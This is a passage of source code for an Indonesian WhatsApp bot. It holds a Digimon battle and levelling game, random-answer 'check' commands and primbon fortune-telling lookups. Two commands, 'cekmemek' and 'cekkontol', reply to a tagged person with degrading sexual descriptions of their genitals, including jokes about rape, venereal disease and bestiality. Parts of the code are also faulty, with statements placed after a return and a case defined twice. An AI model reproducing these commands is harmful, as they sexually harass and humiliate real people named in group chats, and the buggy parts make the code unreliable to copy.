                        text: `*${m2}[ ( ${userDigimons[m.sender]} ) -> CARD - ATTACK ]${m2}*

*-_ Parameter Info _-*

_Digi: ${userDigimons[m.sender]}_
_Use Type: .slash_
_Result: 84 attk_
_Coldown: 9 Sec_

> ${m2}<!> CARD SLASH <!>${m2}

*${m2}[ ( ${userDigimons[userId]} ) <- ATTACKED ]${m2}*

*-_ Your Parameter Info _-*

_Digi: ${userDigimons[userId]}_
_Healt: ${getDarah(userId)}_`
                    });
                }, 1200);
                

if (isdarahnol === 0) {
ptz.sendMessage(m.sender, {text:responmenangn})
setTimeout(() => {
ptz.sendMessage(userId, {text:responkalahn})
return;
}, 1000)
}
console.log("Log Kalah / Menang")

            }
        } else if (typenyahb === "Break") {
        
        reduceMP(41);
        const isMissbreak = await pickRandom(["MISS","ATTK"])
        
        if (isMissbreak === "ATTK") {
            kurangDarah(userId, userdb.attackdigi);
            
            ptz.sendMessage(m.sender, { text: "*`[ BREAK INFINITY ]`* -> Attack Boost\n> <!> Succesfuly Attack" });

            setTimeout(() => {
                ptz.sendMessage(userId, {
                    text: `*${m2}[ ( ${userDigimons[m.sender]} ) -> BREAK INFINITY - ATTACK ]${m2}*

*-_ Parameter Info _-*

_Digi: ${userDigimons[m.sender]}_
_Use Type: .break_
_Result: ${userdb.attackdigi} attk & more 14 Sec No coldown_
_Coldown: -_

> ${m2}<!> BREAK INFINITY <!>${m2}

*${m2}[ ( ${userDigimons[userId]} ) <- ATTACKED ]${m2}*

*-_ Your Parameter Info _-*

_Digi: ${userDigimons[userId]}_
_Healt: ${getDarah(userId)}_`
                });
                
                userdb.breakk = true
            }, 1800);
            
if (isdarahnol === 0) {
ptz.sendMessage(m.sender, {text:responmenangn})
setTimeout(() => {
ptz.sendMessage(userId, {text:responkalahn})
return;
}, 1000)
}
console.log("Log Kalah / Menang")
    
userdb.kuldonattack = new Date();    
let cooldownn = 9000; 
    userdb.attacknocul = new Date() * 1 + cooldownn;
return;
            } else if (isMissbreak === "MISS") {
                        ptz.sendMessage(userId, {
                    text: `*${m2}[ ( ${userDigimons[m.sender]} ) -> BREAK INFINITY SLASH - ATTACK ]${m2}*

*-_ Parameter Info _-*

_Digi: ${userDigimons[m.sender]}_
_Use Type: .break_
_Result: 0 attk & 0 more sec Attk_
_Coldown: 9 Sec_

${m2}<!> MISS ATTACK <!>${m2}`
                });
                
            setTimeout(() => {
                ptz.sendMessage(userId, {
                    text: `*${m2}[ ( ${userDigimons[m.sender]} ) -> BREAK INFINITY SLASH - ATTACK ]${m2}*

*-_ Parameter Info _-*

_Digi: ${userDigimons[m.sender]}_
_Use Type: .break_
_Result: 0 attk & 0 more sec Attk_
_Coldown: 9 Sec_

${m2}<!> MISS ATTACK <!>${m2}`
                });
            }, 1200)
    }
   }}






const digimon = getRandomDigimon();

const addDarahOrang = (userId, amount) => {
 

    userdb.DarahOrang = Math.min(userdb.DarahOrang + amount, 300);
   
    return `HP ${userId} bertambah ${amount}. Total HP sekarang: ${userdb.DarahOrang}`
};

    const spinDigimon = (userId, m) => {
    if (userDigimons[userId]) {
        return m.reply(`[ Veemon ] You already have a Digimon: ${userDigimons[userId]}`);
    }

    
    if (!digimon) {
        return m.reply(`[ Veemon ] Ouh no, There No more Digimon For You.`)
    }
m.reply ("[ Veemon ] I'm Select Digimon For you, Please wait..")
    userDigimons[userId] = digimon;
    saveData(path, userDigimons);
    setTimeout(async () => {
    return reply(`Congratulations! You got a ${digimon}`);
    userdb.attackdigi = 53
    userdb.maxdarahdigi = 230
    userdb.DarahOrang = 230
    userdb.digivice = true
    userdb.tp = 5
    userdb.bits = 15
    userdb.kenyang = 340
    userdb.happy = 100
    userdb.mpmax = 150
    userdb.mp = 150
    userdb.recoverplug = 10
    }, 2100)
};



const showMyDigimon = (userId, m) => {
    if (userDigimons[userId]) {
        return reply(`Your Digimon: ${userDigimons[userId]}`);
    } else {
        return reply(`You don't have any Digimon yet. Type '.getdigi' to get one.`);
    }
};

 
 const ensureDirectoryExistence = (filePath) => {
    const dirname = require('path').dirname(filePath);
    if (fs.existsSync(dirname)) {
        return true;
    }
    ensureDirectoryExistence(dirname);
    fs.mkdirSync(dirname);
};

if (fs.existsSync(path)) {
    try {
        userDigimons = JSON.parse(fs.readFileSync(path, 'utf-8'));
    } catch (err) {
        console.error('Error reading JSON file:', err);
        userDigimons = {};
    }
}



async function sidigi() {
try {
//if (userDigimons[m.sender] === "Veemon") return "Imperialdramon"
return `${userDigimons[m.sender]}`
} catch(e) {
 return "none"
}
}

const digiuser = await sidigi()
    let ikamu =  "`"
const resver = `╭──────────────────•
│ *‎${m2}</> - I N F O - B O T - </>${m2}*
╭──────────────────•
│ ◦  *ᴜᴘʟᴏᴀᴅ:* ${upload}
│ ◦  *ᴅᴏᴡɴʟᴏᴀᴅ:* ${download}
│ ◦  *ɴᴏᴅᴇᴊꜱ ᴠᴇʀꜱɪᴏɴ:* ${process.version}
│ ◦  *ᴠᴇʀꜱɪᴏɴ:* 1.6
│ ◦  *ᴡʜɪꜱᴋᴇʏꜱᴏᴄᴋᴇᴛꜱ:* 6.6.0
╰──────────────────•
│ *‎${m2}</> - I N F O - U S E R - </>${m2}*
╭──────────────────•
│  ◦  *ᴘʀᴇᴍɪᴜᴍ:* ${isPremium ? 'Yes':'No'}
│  ◦  *ᴅɪɢɪᴍᴏɴ:* ${digiuser}
│  ◦  *ʟɪᴍɪᴛ:* Unlimited
│  ◦  *ʜɪᴛ ᴄᴍᴅ:* ${userdb.hitcmd}
╰──────────────────•
`


    
async function downloadMp3(url) {
try {
// jalur sampah
let mp3File = './tmp/'+getRandom('.mp3')
ytdl(url, {filter: 'audioonly'}).pipe(fs.createWriteStream(mp3File)).on('finish', async() => {
await ptz.sendMessage(m.chat, {audio: fs.readFileSync(mp3File), mimetype: 'audio/mpeg'}, {quoted:m})
fs.unlinkSync(mp3File)
})
} catch(e) {
console.log(e)
return console.log(util.format(e))
}
}
let userLevels = {};
let userXP = {};

// Load and Save Levels and XP
const levelsPath = './Rpg/Levels.json';
const xpPath = './Rpg/XP.json';

userLevels = loadData(levelsPath, {});
userXP = loadData(xpPath, {});

const saveLevels = () => {
    saveData(levelsPath, userLevels);
};

const saveXP = () => {
    saveData(xpPath, userXP);
};


const addXP = (userId, xp, m) => {
    if (!userXP[userId]) {
        userXP[userId] = 0;
        userLevels[userId] = 1;
    }

    userXP[userId] += xp;

    while (userXP[userId] >= userLevels[userId] * 100) {
        userXP[userId] -= userLevels[userId] * 100;
        userLevels[userId] += 1;
        reply(`Congratulations! Your Digimon leveled up to Level ${userLevels[userId]}!`);
    }

    saveXP();
    saveLevels();
};

// status digimon mu
const showLevel = (userId, m) => {
    if (!userLevels[userId]) {
        return m.reply("You have no levels or digimon.");
    }

    const level = userLevels[userId];
    const xp = userXP[userId];
    return m.reply(`*${m2}[ ${userDigimons[userId]} ]${m2}*\n\n Your Digimon is Level ${level} with ${xp}/${level * 100} XP.`);
};



let list = []
for (let i of newowner) {
list.push({
displayName: await ptz.getName(i + '@s.whatsapp.net'),
vcard: `BEGIN:VCARD\n
VERSION:3.0\n
N:${await ptz.getName(i + '@s.whatsapp.net')}\n
FN:${await ptz.getName(i + '@s.whatsapp.net')}\n
item1.TEL;waid=${i}:${i}\n
item1.X-ABLabel:Ponsel\n
item2.EMAIL;type=INTERNET:ziooedt@gmail.com\n
item2.X-ABLabel:Email\n
item3.URL:https://ziyo.com
item3.X-ABLabel:YouTube\n
item4.ADR:;;Indonesia;;;;\n
item4.X-ABLabel:Region\n
END:VCARD`
})
}
    
switch(command) {
/* ############ Add Case By Reivaldo Ziyoo ############### */
case 'mutegc':
if (!isCreator) return 
if (text === "on") {
db.data.chats[m.chat].mute = true
m.reply("Succes")
} else if (text === "off") {
db.data.chats[m.chat].mute = false
m.reply("Succes")
} else {
m.reply("on / off")
}
break
        case 'bisakah':{

const bisakah = text
const bisa =['BISA','Tidak Bisa','Oh tentu saja bisa dong','Udah dari lahir dia bisa kaya gitu kak 😂˜„','Oh tentu saja tidak bisa','Wuih bisa bisa','Ga mao jawab ah lu wibu','Tentu saja bisa eh tapi boong awokawok ','Engga engga dia ga bisa','Enggaklah','Aku ga mao jawbab 😆™‚','Rahasia dong','Ulangi Tod gua ga paham','Mana gua tau anjir']
const keh = bisa[Math.floor(Math.random() * bisa.length)]
ptz.sendMessage(m.chat, { contextInfo: { externalAdReply: { showAdAttribution: true,
title: `- Check And Check -`,previewType:"PHOTO",thumbnail: fs.readFileSync("./1x1.jpg"),sourceUrl: `https://whatsapp.com/channel/0029VaiskcuGJP8O84HwJu0y`,}
}, text: '*Pertanyaan : '+bisakah+'*\n\n*Jawaban :* '+ keh }, { quoted: m })
}
break
case 'gimana':
case 'gimanadong':
case 'bagaimanakah':{

const bagaimanakah = text
const bagai =['Kita Kenal?','Nanya Terus deh','Tidak Tahu','Gua tabok boleh ?','Cari Aja Sendiri','Kurang Tahu','Mana Saya Tahu, Saya kan ikan','Hah kamu tanya sama aku trus aku tanya ke siapa dong','Whahahaha ga tau 😑']
const mana = bagai[Math.floor(Math.random() * bagai.length)]
ptz.sendMessage(m.chat, { contextInfo: { externalAdReply: { showAdAttribution: true,
title: `- Check And Check -ㅤㅤㅤㅤㅤㅤㅤㅤㅤ`,body:`⌜ ${ucapanWaktu} ⌟`,previewType:"PHOTO",thumbnail: fs.readFileSync("./1x1.jpg"),sourceUrl: `https://whatsapp.com/channel/0029VaiskcuGJP8O84HwJu0y`,}
}, text: '*Pertanyaan : '+bagaimanakah+'*\n\n*Jawaban :* '+ mana}, { quoted: m })
}
break
case 'apakah':{

const apakah = text
const apa =['iya dong jelas itu','Tidak lah','Oh tentu saja tidak','Ya mana saya tau kok tanya saya','Rahasia dong','ga usah di tanya emang udah kaya gitu dia','Au ah mending mandi','Bentar aku lagi berak','Knpa emang kamu suka sama dia yak ??','Haha mna mungkin 👻']
const kah = apa[Math.floor(Math.random() * apa.length)]
ptz.sendMessage(m.chat, { contextInfo: { externalAdReply: { showAdAttribution: true,
title: `- Check And Check -ㅤㅤㅤㅤㅤㅤㅤㅤㅤ`,body:`⌜ ${ucapanWaktu} ⌟`,previewType:"PHOTO",thumbnail: fs.readFileSync("./1x1.jpg"),sourceUrl: `wa.me/6281316643491`,}
}, text: '*Pertanyaan : '+apakah+'*\n\n*Jawaban :* '+ kah}, { quoted: m })
}
break
case 'kapankah':{

const kapankah = text
const kapan =['Besok','Lusa','1 Hari Lagi','2 Hari Lagi','3 Hari Lagi','4 Hari Lagi','5 Hari Lagi','6 Hari Lagi','1 Bulan Lagi','2 Bulan Lagi','3 Bulan Lagi','4 Bulan Lagi','5 Bulan Lagi','6 Bulan Lagi','7 Bulan Lagi','8 Bulan Lagi','9 Bulan Lagi','10 Bulan Lagi','11 Bulan Lagi','1 Tahun lagi','2 Tahun lagi','3 Tahun lag0i','4 Tahun lagi','5 Tahun lagi','6 Tahun lagi','7 Tahun lagi','8 Tahun lagi','9 Tahun lagi','10 Tahun lagi']
const koh = kapan[Math.floor(Math.random() * kapan.length)]
ptz.sendMessage(m.chat, { contextInfo: { externalAdReply: { showAdAttribution: true,
title: `- Check And Check -ㅤㅤㅤㅤㅤㅤㅤㅤㅤ`,body:`⌜ ${ucapanWaktu} ⌟`,previewType:"PHOTO",thumbnail: fs.readFileSync("./1x1.jpg"),sourceUrl: `https://whatsapp.com/channel/0029VaiskcuGJP8O84HwJu0y`,}
}, text: '*Pertanyaan : '+kapankah+'*\n\n*Jawaban :* '+ koh}, { quoted: m })
}
break
    case 'watakcek': case 'cekwatak':
const watak = text
const wa =['Penyayang','Pemurah','Pemarah','Pemaaf','Penurut','Baik','Baperan','Baik Hati','penyabar','UwU','top deh, pokoknya','Suka Membantu']
const tak = wa[Math.floor(Math.random() * wa.length)]
ptz.sendMessage(m.chat, { text: 'Pertanyaan : *'+watak+'*\n\nJawaban : '+ tak}, { quoted: m })
break				
    case 'hobbycek': case 'cekhobby':
const hobby = text
const hob =['Memasak','Membantu Atok','Mabar','Nobar','Sosmedtan','Membantu Orang lain','Nonton Anime','Nonton Drakor','Naik Motor','Nyanyi','Menari','Bertumbuk','Menggambar','Foto fotoan Ga jelas','Maen Game','Berbicara Sendiri']
const by = hob[Math.floor(Math.random() * hob.length)]
ptz.sendMessage(m.chat, { text: 'Pertanyaan : *'+hobby+'*\n\nJawaban : '+ by}, { quoted: m })
break
case 'cebelapaimutciaku': case 'seberapaimutsiaku':{

const edgar = text
const nanya =['*79%*\n\nImut Banget Loh Kawai><','*15%*\n\nKamu imut kata mamakmu:v🗿','*30%*\n\nMene Ketehe Kok Tanya saya\nMinimal Mandi🗿','*28%*\n\nIya deh Cipaling Imut;)','*100%*\n\nPap imutnya dulu dong:v😘']
const pret = nanya[Math.floor(Math.random() * nanya.length)]
ptz.sendMessage(m.chat, { contextInfo: { externalAdReply: { showAdAttribution: true,
title: `- Check And Check -`,body:`⌜ ${ucapanWaktu} ⌟`,previewType:"PHOTO",thumbnail: fs.readFileSync("./1x1.jpg"),sourceUrl: `https://whatsapp.com/channel/0029VaiskcuGJP8O84HwJu0y`,}
}, text: '*Pertanyaan : '+edgar+'*\n\n*Jawaban :* '+ pret}, { quoted: m })
}
break
    case 'cekmemek':
			case 'cekmeki':
				 
if (!q) return m.reply('tag temanmu!')
				const persengayy = text
          const gay = ["*Udah Ga Perawan:v*\n• Warna Item🙈\n• Bulu Lebat\n• Katanya Polos Ko Lima Jari Lolos Chuackk","*Masih Perawan*\n• Warna Pink🤤\n• Tidak Berbulu\n• Wah Yang ini Buat Owner Ku Aja😋","*Bjir Bau 😵‍💫*\n\n• Kang Colmek\n• Sangat Lebat:v\n• Ishh Sarang Jin Itu😵","*Masih Perawan*\n• Warna Putih Mati\n• Masih Polos\n• Sepertinya Anda Butuh Ktetotgatan Dari Owner ku🥸 ","*Meki nya Semu Coklat*\n • Korban Pemerkosaan 😑\n• Lu Sih Main Ma Kumpulan Cowo Sengklek\n• Sebaiknya Jan Terlalu Gegabah 🤧","*Normal Seperti Biasanya*\n• Wuanjay Ko Bulu Nya Pada Kriput🙈\n• Ternyata Oh Ternyata Kamu Suka Lesby🫤","*Bahaya Noh Gan*\n• Udah Kena Virus\n• Kalo wik wik Ntar Ke Patil Cowoknya\n😶‍🌫️Takut BerNanah Kelamin Ku ntarr😬","*Lah Ireng Amat bjirr*\n• Hati² Sama Ni Orang Beneran Dah\n• Jangankan Pria Hewan Pun Dia Layani🫣","*74%*\n*Astagfirullah Kabur Gan🏃🌬️*"]
				const kl = gay[Math.floor(Math.random() * gay.length)]
    ptz.sendMessage(m.chat, { contextInfo: { externalAdReply: { showAdAttribution: true,
title: `- Check And Check -ㅤㅤㅤㅤㅤㅤㅤㅤㅤ`,body:`⌜ ${ucapanWaktu} ⌟`,previewType:"PHOTO",thumbnail: fs.readFileSync("./1x1.jpg"),sourceUrl: `https://whatsapp.com/channel/0029VaiskcuGJP8O84HwJu0y`,}
}, text :'Hasil Dari: *'+persengayy+'*\n\nJawaban : '+kl}, { quoted: m })
				break  

			case 'cekkontol':
				
if (!q) return reply('Mana Nama?')
				
	const persenbucin = text
    const bucin =
          ["Hadehh🤦\n[ Dah Item Bauk Lagi ishh🤮 ]","9%\n\nMasih Kecil Ini Mah Ketutup Ama bulu komt nya🗿 Ae","Nakk Masih Kecil","28%\n\nYoalahh hmm","34%\n\nMayan Lah","48%\n\nGatau","59%\n\nBiasa Kang Coli Mah Tityd nya Item🗿","apacoba\nKasian Mana Masih Muda","itu tityd apa terong"," Ya Ampun"]
				const tetot = bucin[Math.floor(Math.random() * bucin.length)]
    ptz.sendMessage(m.chat, { contextInfo: { externalAdReply: { showAdAttribution: true,
title: `- Check And Check -ㅤㅤㅤㅤㅤㅤㅤㅤㅤ`,body:`⌜ ${ucapanWaktu} ⌟`,previewType:"PHOTO",thumbnail: fs.readFileSync("./1x1.jpg"),sourceUrl: `https://whatsapp.com/channel/0029VaiskcuGJP8O84HwJu0y`,}
}, 
text : 'cekkomtlo🗿: *'+persenbucin+'*\n\nJawaban : '+ tetot}, { quoted: m })
				break 

  case 'cekme':{

let ppimg = await ptz.profilePictureUrl(sender, 'image').catch(_ => 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg')
const sifat =['Baek','Jutek','Ngeselin','Bobrok','Pemarah','Sopan','Beban','Sangean','Cringe','Pembohong']
const hoby =['Memasak','Membantu Atok','Mabar','Nobar','Sosmedtan','Membantu Orang lain','Nonton Anime','Nonton Drakor','Naik Motor','Nyanyi','Menari','Bertumbuk','Menggambar','Foto fotoan Ga jelas','Maen Game','Berbicara Sendiri']
const bukcin =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const arp =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const cakep =['Iyaa cakep','Maaf Kak, Banyak² Perawatan Ya','Jelek ajg','Cakep banget😍','❌','✔️']
const wetak=['Penyayang','Pemurah','Pemarah','Pemaaf','Penurut','Baik','Baperan','Baik Hati','penyabar','UwU','top deh, pokoknya','Suka Membantu']
const baikk =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const bhuruk =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const cerdhas =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const berhani =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const mengheikan =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const suka = ['Makan','Tidur','Main Game','Sesama Jenis','Binatang',`Seseorang Yang ${pushname} Sukai`,'Belajar','Ibadah','Diri Sendiri']
const sipat = sifat[Math.floor(Math.random() * sifat.length)]
const biho = hoby[Math.floor(Math.random() * hoby.length)]
const bhucin = bukcin[Math.floor(Math.random() * bukcin.length)]
const senga = arp[Math.floor(Math.random() * arp.length)]
const chakep = cakep[Math.floor(Math.random() * cakep.length)]
const watak = wetak[Math.floor(Math.random() * wetak.length)]
const baik = baikk[Math.floor(Math.random() * baikk.length)]
const burug = bhuruk[Math.floor(Math.random() * bhuruk.length)]
const cerdas = cerdhas[Math.floor(Math.random() * cerdhas.length)]
const berani = berhani[Math.floor(Math.random() * berhani.length)]
const takut = mengheikan[Math.floor(Math.random() * mengheikan.length)]
const gai = suka[Math.floor(Math.random() * suka.length)]

let its = await getBuffer (ppimg)
let teks = ` *${m2}[ PRIVATE CHECK ]${m2}* 

∘ *Nama :*  ${pushname}
∘ *Sifat :*  ${sipat}
∘ *Bucin :*  ${bhucin}%
∘ *Cakep :*  ${chakep}
∘ *Watak :*  ${watak}
∘ *Hobby :*  ${biho}
∘ *Ketakutan :*  ${takut}%
∘ *Keberanian :*  ${berani}%
∘ *Kecerdasan :*  ${cerdas}%
∘ *Akhlak Baik :*  ${baik}%
∘ *Akhlak Buruk :*  ${burug}%
∘ *Menyukai :* ${gai} `
ptz.sendMessage(m.chat, { contextInfo: { externalAdReply: {showAdAttribution: true,
title: `- Check And Check -ㅤㅤㅤㅤㅤㅤㅤㅤㅤ`,body:`⌜ ${ucapanWaktu} ⌟`,previewType:"PHOTO",thumbnail: fs.readFileSync("./1x1.jpg"),sourceUrl: `https://tinyurl.com/2p7fks3c`,}
}, image: fs.readFileSync("./1x1.jpg"), caption: teks}, { quoted: m })
}

break

 // ===================================== // primbon
  case 'artinama': {
if (!q) return reply( `Example : ${prefix + command} tetotz `)
let anu = await primbon.arti_nama(q)
if (anu.status == false) return m.reply(anu.message)
let teks = `
∘ *Nama :* ${anu.message.nama}
∘ *Arti :* ${anu.message.arti}
∘ *Catatan :* ${anu.message.catatan}`
reply(teks)
}
break	 
    
case 'artimimpi': case 'tafsirmimpi': {
if (!q) return reply( `Example : ${prefix + command} belanja`)
let anu = await primbon.tafsir_mimpi(q)
if (anu.status == false) return m.reply(anu.message)
let teks = `
• *Mimpi :* ${anu.message.mimpi}
• *Arti :* ${anu.message.arti}
• *Solusi :* ${anu.message.solusi}`
reply(teks)
}
break
 case 'pasangan': {
if (!q) return reply( `Example : ${prefix + command} tetotz|Angel`)
let [nama1, nama2] = q.split`|`
let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2)
if (anu.status == false) return m.reply(anu.message)
let teks = `
• *Nama Anda :* ${anu.message.nama_anda}
• *Nama Pasangan :* ${anu.message.nama_pasangan}
• *Sisi Positif :* ${anu.message.sisi_positif}
• *Sisi Negatif :* ${anu.message.sisi_negatif}`
reply(teks)
}
break   
case 'ramalancinta': case 'ramalcinta': {
if (!q) return reply( `Example : ${prefix + command} tetotz, 28, 6, 2004, angel, 16, 11, 2004`)
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = q.split`,`
let anu = await primbon.ramalan_cinta(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return m.reply(anu.message)
let teks = `
• *Nama Anda :* ${anu.message.nama_anda.nama}
• *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}
• *Nama Pasangan :* ${anu.message.nama_pasangan.nama}
• *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}
• *Sisi Positif :* ${anu.message.sisi_positif}
• *Sisi Negatif :* ${anu.message.sisi_negatif}
• *Catatan :*
${anu.message.catatan}`
reply(teks)
}
break   
case 'kecocokannama': 
case 'cocoknama': {
if (!q) return reply( `Example : ${prefix + command} tetotz, 28, 6, 2004`)
let [nama, tgl, bln, thn] = q.split`,`
let anu = await primbon.kecocokan_nama(nama, tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
let teks = `
• *Nama :* ${anu.message.nama}
• *Lahir :* ${anu.message.tgl_lahir}
• *Life Path :* ${anu.message.life_path}
• *Destiny :* ${anu.message.destiny}
• *Destiny Desire :* ${anu.message.destiny_desire}
• *Personality :* ${anu.message.personality}
• *Persentase :* ${anu.message.persentase_kecocokan}`
reply(teks)
}
break 
    case 'kecocokanpasangan':
case 'cocokpasangan':
case 'pasangan': {
if (!q) return reply( `Example : ${prefix + command} Dika|Novia`)
let [nama1, nama2] = q.split`|`
let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2)
if (anu.status == false) return m.reply(anu.message)
let teks = `
• *Nama Anda :* ${anu.message.nama_anda}
• *Nama Pasangan :* ${anu.message.nama_pasangan}
• *Sisi Positif :* ${anu.message.sisi_positif}
• *Sisi Negatif :* ${anu.message.sisi_negatif}`
reply(teks)
}
break
case 'jadiannikah': {
if (!q) return reply( `Example : ${prefix + command} 6, 12, 2020`)
let [tgl, bln, thn] = q.split`,`
let anu = await primbon.tanggal_jadian_pernikahan(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
let teks = `
• *Tanggal Pernikahan :* ${anu.message.tanggal}
• *karakteristik :* ${anu.message.karakteristik}`
reply(teks)
}
break
case 'sifatusaha': {
if (!q) return reply( `Example : ${prefix + command} 28, 12, 2021`)
let [tgl, bln, thn] = q.split`,`
let anu = await primbon.sifat_usaha_bisnis(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
let teks = `
• *Lahir :* ${anu.message.hari_lahir}
• *Usaha :* ${anu.message.usaha}`
reply(teks)
}
break
    case 'rejeki': 
case 'rezeki': {
if (!q) return reply( `Example : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = q.split`,`
let anu = await primbon.rejeki_hoki_weton(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
let teks = `
• *Lahir :* ${anu.message.hari_lahir}
• *Rezeki :* ${anu.message.rejeki}
• *Catatan :* ${anu.message.catatan}`
reply(teks)
}
break
case 'pekerjaan':  {
if (!q) return reply( `Example : ${prefix + command}  7, 7, 2005`)
let [tgl, bln, thn] = q.split`,`
let anu = await primbon.pekerjaan_weton_lahir(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
let teks = `
• *Lahir :* ${anu.message.hari_lahir}
• *Pekerjaan :* ${anu.message.pekerjaan}
• *Catatan :* ${anu.message.catatan}`
reply(teks)
}
break
case 'ramalnasib': 
case 'nasib': {
if (!q) return reply( `Example : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = q.split`,`
let anu = await primbon.ramalan_nasib(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
let teks = `
• *Analisa :* ${anu.message.analisa}
• *Angka Akar :* ${anu.message.angka_akar}
• *Sifat :* ${anu.message.sifat}
• *Elemen :* ${anu.message.elemen}
• *Angka Keberuntungan :* ${anu.message.angka_keberuntungan}`
reply(teks)
}
break 
case 'penyakit': {
if (!q) return reply( `Example : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = q.split`,`
let anu = await primbon.cek_potensi_penyakit(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
let teks = `
• *Analisa :* ${anu.message.analisa}
• *Sektor :* ${anu.message.sektor}
• *Elemen :* ${anu.message.elemesektorn}
• *Catatan :* ${anu.message.catatan}`
reply(teks)
}
break
case 'artitarot': 
case 'tarot': {
if (!q) return reply( `Example : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = q.split`,`
let anu = await primbon.arti_kartu_tarot(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
let teks = `
• *Lahir :* ${anu.message.tgl_lahir}
• *Simbol Tarot :* ${anu.message.simbol_tarot}
• *Arti :* ${anu.message.arti}
• *Catatan :* ${anu.message.catatan}`
reply(teks)
}
break
case 'fengshui': {
if (!q) return reply( `Example : ${prefix + command} aqio, 1, 2005\n\nNote : ${prefix + command} Nama, gender, tahun lahir\nGender : 1 untuk laki-laki & 2 untuk perempuan`)
let [nama, gender, tahun] = q.split`,`
let anu = await primbon.perhitungan_feng_shui(nama, gender, tahun)
if (anu.status == false) return m.reply(anu.message)
let teks = `
• *Nama :* ${anu.message.nama} 
• *Lahir :* ${anu.message.tahun_lahir}
• *Gender :* ${anu.message.jenis_kelamin}
• *Angka Kua :* ${anu.message.angka_kua}
• *Kelompok :* ${anu.message.kelompok}
• *Karakter :* ${anu.message.karakter}
• *Sektor Baik :* ${anu.message.sektor_baik}
• *Sektor Buruk :* ${anu.message.sektor_buruk}`
reply(teks)
}
break
case 'haribaik': {
if (!q) return reply( `Example : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = q.split`,`
let anu = await primbon.petung_hari_baik(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
let teks = `
• *Lahir :* ${anu.message.tgl_lahir}
•™*Kala Tinantang :* ${anu.message.kala_tinantang}
• *Info :* ${anu.message.info}
• *Catatan :* ${anu.message.catatan}`
reply(teks)
}
break
case 'harisangar': 
case 'taliwangke': {
if (!q) return reply( `Example : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = q.split`,`
let anu = await primbon.hari_sangar_taliwangke(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
let teks = `
• *Lahir :* ${anu.message.tgl_lahir}
• *Hasil :* ${anu.message.result}
• *Info :* ${anu.message.info}
• *Catatan :* ${anu.message.catatan}`
reply(teks)
}
break
case 'harisial': {
if (!q) return reply( `Example : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = q.split`,`
let anu = await primbon.primbon_hari_naas(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
let teks = `
• *Hari Lahir :* ${anu.message.hari_lahir}
